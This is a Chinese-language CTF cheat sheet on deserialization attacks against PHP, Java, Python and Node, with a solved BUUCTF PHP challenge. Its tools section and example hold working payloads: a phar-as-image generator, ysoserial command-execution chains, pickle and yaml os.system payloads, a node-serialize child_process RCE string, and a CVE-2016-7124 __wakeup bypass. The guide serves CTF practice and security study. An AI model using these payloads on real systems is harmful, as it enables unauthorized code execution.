# 反序列化

关键词：反序列化 反序列化漏洞 POP链 魔术方法 phar Java反序列化 pickle unserialize 原生反序列化

## ① 识别指纹

- 参数值 base64 解码后形如 `O:4:"User":2:{s:4:"name";...}` → PHP
- base64 解码后以 `rO0AB` 开头（文件头 `AC ED 00 05`）→ Java
- 附件是 `.jar`、`pom.xml`、`WEB-INF/classes`，或源码里有 `readObject`
- Python 服务出现 `pickle.loads` / `yaml.load`，参数 base64 以 `gASV` 开头
- Node 项目依赖 `node-serialize`，参数里出现 `_$$ND_FUNC$$_`
- Cookie、隐藏域、`?data=`、`?code=` 里挂着一长串 base64
- 题干出现 **反序列化、POP、unserialize、phar、ysoserial** 或提示"备份文件"
- 源码里有 `unserialize($x)`、`__destruct`、`__wakeup`、`__toString`

## ② 考什么

- PHP 魔术方法：`__construct`、`__destruct`、`__wakeup`、`__sleep`、`__toString`、`__invoke`、`__call`、`__get`、`__set`、`__isset`
- POP 链：从入口类出发，用属性赋值把魔术方法串到 sink
- 私有/保护属性的序列化格式（`%00类名%00属性`、`%00*%00属性`）
- `__wakeup` 绕过（CVE-2016-7124，PHP < 5.6.25 / < 7.0.10）
- 反序列化字符逃逸（`str_replace` 后长度变化，撑大或吃掉字符）
- `phar://` 反序列化（metadata 触发，不需要显式 `unserialize`）
- 原生类利用（`SoapClient` SSRF、`SplFileObject` 读文件、`Error`/`Exception` XSS）
- PHP session 反序列化（`session.serialize_handler`）
- Java：`ysoserial`、`URLDNS` 探测、CommonsCollections 链、`readObject` 入口、JNDI
- Python `pickle` 的 `__reduce__`、`yaml.load`
- Node `node-serialize` 的 `_$$ND_FUNC$$_` 立即执行

## ③ 判断流程

> 第一件事永远是找入口：谁把用户输入喂给了反序列化函数。没有入口，链再漂亮也没用。

1. 源码搜 `unserialize(`、`readObject(`、`pickle.loads`、`yaml.load`、`node-serialize`；请求里搜 `O:`、`rO0AB`、`gASV`、`_$$ND_FUNC$$_` → 按语言分流：PHP 第 4 条 / Java 第 9 条 / Python 第 12 条 / Node 第 13 条
2. 没有明显入口但参数是一长串 base64 → 先解码看结构，再回第 1 条分流；解码失败 → 跳第 3 条
3. 有上传点，且源码里有文件操作（`file_exists`、`filesize`、`getimagesize`、`file_get_contents`）→ 试 `phar://`，跳第 8 条
4. **PHP**：把源码里所有 class 与魔术方法列成表，标出每个方法内部调用的函数 → 找到最终 sink（`system`、`eval`、`include`、`file_put_contents`、`call_user_func`）
5. 从"属性可控的入口类"反向画链：入口类 → 属性 → 魔术方法 → 下一个类，直到 sink；某条边要求"属性类型不可控"就换一条链
6. 构造 payload：用 `serialize()` 生成后手工改值；private 属性写 `%00类名%00属性名`，protected 写 `%00*%00属性名`，`s:` 后面的长度按字节算
7. 目标有 `__wakeup`/`__destruct` 里的检查要绕 → 把对象属性数 +1 跳过 `__wakeup`（CVE-2016-7124，仅旧版本）；版本不支持 → 回第 4 条换一条不经过 `__wakeup` 的链
8. `phar://`：生成 `.phar` 后改名 `.jpg` 上传，再用 `phar://上传路径/x.jpg` 触发；调用点必须是 `file_exists` 这类文件函数，字符串里出现 `phar://` 不算
9. **Java**：先用 `ysoserial URLDNS` 打 DNS 日志 → 有回显说明反序列化点存在，跳第 10 条；没回显 → 回第 1 条确认入口（检查入口是 JSON/XML 转换器还是原生反序列化）
10. 确认入口后枚举 classpath（`pom.xml`、`WEB-INF/lib`、报错栈）→ 选目标实际存在的 gadget 链，不要默认 CommonsCollections
11. 用 `ysoserial` 生成命令执行 payload；高版本 JDK 下 CC 链失效 → 换 `CommonsBeanutils1`，或先用 `URLDNS` 确认通道再换链
12. **Python**：`pickle.loads` 可控 → `__reduce__` 返回 `(os.system, ('cat /flag',))`；`yaml.load` 可控 → `!!python/object/apply:os.system ["cat /flag"]`
13. **Node**：`node-serialize.unserialize` 可控 → payload 里写 `_$$ND_FUNC$$_function(){...}()`，末尾的 `()` 是立即执行开关
14. 以上都不成立 → 回第 1 条：入口扩到 Cookie、Session、上传文件的 metadata、缓存；先拿版本信息（`phpinfo`、报错栈、`X-Powered-By`）再判断哪条链可用

## ④ 工具与命令

```bash
# 生成 PHP 序列化串（在本地同版本 PHP 里跑最稳）
php -r 'class A{ public $cmd="id"; public $x; } echo serialize(new A()), PHP_EOL;'
# 输出：O:1:"A":2:{s:3:"cmd";s:2:"id";s:1:"x";N;}

# 反向验证 payload 结构
php -r 'var_dump(unserialize("O:1:\"A\":1:{s:3:\"cmd\";s:2:\"id\";}"));'
```

```php
<?php
// gen.php：生成 phar，必须 php -d phar.readonly=0 gen.php
class A { public $cmd = "system"; }
$p = new Phar("exp.phar");
$p->startBuffering();
$p->addFromString("test.txt", "test");
$p->setStub("<?php __HALT_COMPILER(); ?>");
$p->setMetadata(new A());
$p->stopBuffering();
```

```bash
php -d phar.readonly=0 gen.php
cp exp.phar exp.jpg                     # 伪装成图片上传
# 触发：?file=phar://upload/exp.jpg/test.txt
```

```bash
# Java：URLDNS 只发 DNS 请求，不需要目标有可利用 gadget
java -jar ysoserial.jar URLDNS "http://test.dnslog.cn" > urldns.bin
base64 -w0 urldns.bin

# 命令执行（先确认 classpath 里有对应链）
java -jar ysoserial.jar CommonsCollections5 "cat /flag" > payload.bin
java -jar ysoserial.jar CommonsBeanutils1 "cat /flag" > payload.bin
```

```python
# pickle 生成器
import pickle, os, base64
class Evil:
    def __reduce__(self):
        return (os.system, ("cat /flag",))
print(base64.b64encode(pickle.dumps(Evil())).decode())

# yaml.load 可控时（旧版 PyYAML 或 Loader=yaml.Loader）
yaml_payload = '!!python/object/apply:os.system ["cat /flag"]'
```

```js
// 目标调用 require('node-serialize').unserialize(input) 时
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'cat /flag\',function(e,o){console.log(o)})}()"}';
// 末尾的 () 不能少，否则函数只是被定义
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| 属性数改大后 `__wakeup` 仍执行 | 目标是 PHP 7.4+，CVE-2016-7124 已修复 | 先确认 PHP 版本，7.4+ 换一条不依赖跳过的链 |
| private 属性写了但值不生效 | 少了 `%00类名%00` 前缀，或 `s:` 长度没算两个 `\0` | 用 PHP 自己 `serialize()` 生成再改名，别手写 |
| base64 传到后端解不出来 | `+` 在 URL 里被解码成空格 | 用 `--data-urlencode`，或把 `+` 写成 `%2B` |
| `phar://` 打了没反应 | 触发点不是文件操作函数，或上传的 phar 被改写 | 确认链路里有 `file_exists`/`filesize`/`getimagesize` |
| 生成 phar 报 `phar.readonly` | 该选项默认只读 | `php -d phar.readonly=0 gen.php` |
| Java 报 `InvalidClassException` | `serialVersionUID` 与目标类不匹配 | 用目标同版本的依赖生成 payload |
| ysoserial 报 `ClassNotFoundException` | 目标 classpath 没有该 gadget | 看 `WEB-INF/lib` / `pom.xml` 决定用哪条链 |
| 反序列化成功但没执行命令 | 对象没走到 sink，或魔术方法里还有条件判断 | 回源码逐行核对每个属性值 |
| Node payload 不执行 | 少了末尾的 `()` | 写成 `_$$ND_FUNC$$_function(){...}()` |

## ⑥ 例题

**题目**：`[极客大挑战 2019] PHP`
**来源**：BUUCTF 复现平台（原题出自 2019 极客大挑战）
**题干**：一个博客风格页面，提示"网站有备份文件"。

**附件/入口**：访问 `www.zip` 下载源码，包含 `index.php`、`class.php`、`flag.php`。

**关键观察**：

- `index.php` 里 `$select = $_GET['select']; unserialize(@$select);` —— 入口是 GET 参数 `select`
- `class.php` 的 `Name` 类：`__wakeup()` 把 `username` 改回 `guest`；`__destruct()` 要求 `password == 100` 且 `username === 'admin'` 才输出 flag
- 两个属性都是 `private`，序列化后属性名是 `%00Name%00username` 这种形式，长度 14

**走了哪条链**：第 1 条（源码里搜到 `unserialize`）→ 第 4 条（列出 `Name` 类与魔术方法，定位 `__destruct` 的 sink）→ 第 6 条（构造对象、处理 private 属性）→ 第 7 条（属性数从 2 改成 3，跳过 `__wakeup`）。

**命令与输出**：

```php
<?php
// 本地生成后，手工把 O:4:"Name":2: 改成 :3:
class Name {
    private $username = 'admin';
    private $password = 100;
}
echo urlencode(serialize(new Name()));
```

输出（`%00` 是不可见字节）：

```text
O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D
```

把 `%3A2%3A` 改成 `%3A3%3A` 后请求：

```text
?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D
→ flag{...}
```

`__destruct` 里 `username` 已经是 `admin`（`__wakeup` 被跳过，没改成 `guest`），`password` 是 `100`，条件满足直接回显 flag。

**结果**：页面直接输出 flag，以原题平台为准。

::: warning 版本边界
CVE-2016-7124 只影响 PHP < 5.6.25 与 < 7.0.10。PHP 7.4+ 上把属性数改大不会跳过 `__wakeup`，反而会让 `unserialize` 直接失败。先看版本，再决定用不用这一招。
:::

::: tip flag 说明
本页例题的 flag 随平台和容器实例变化，不在页内固定。练习目标是走通判断流程。
:::
